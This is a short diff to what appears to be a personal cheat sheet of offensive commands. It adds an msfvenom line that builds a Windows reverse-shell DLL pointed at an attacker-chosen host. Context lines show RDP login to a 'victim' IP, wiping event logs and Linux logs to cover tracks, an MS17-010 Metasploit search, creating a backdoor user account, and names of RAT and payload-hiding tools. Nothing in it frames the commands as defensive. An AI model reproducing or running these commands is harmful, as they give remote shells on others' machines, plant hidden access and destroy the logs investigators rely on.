@@ -15,6 +15,7 @@ rdesktop -u dung -p dung1 <IP-victim>
 clearev           //in window   
 rm -rf messages   //in linux
 ------------------------msf command
+msfupdate
 bg    --> sessions
 search ms17-010
 
@@ -54,6 +55,8 @@ log
 ?   #help
 net user hoan /add
 ----------------------------------    malware
+msfvenom -p windows/shell/reverse_tcp LHOST=YourIP LPORT=YourPort -f dll > shell-cmd.dll
+
 JPS
 shellter
 njRaT
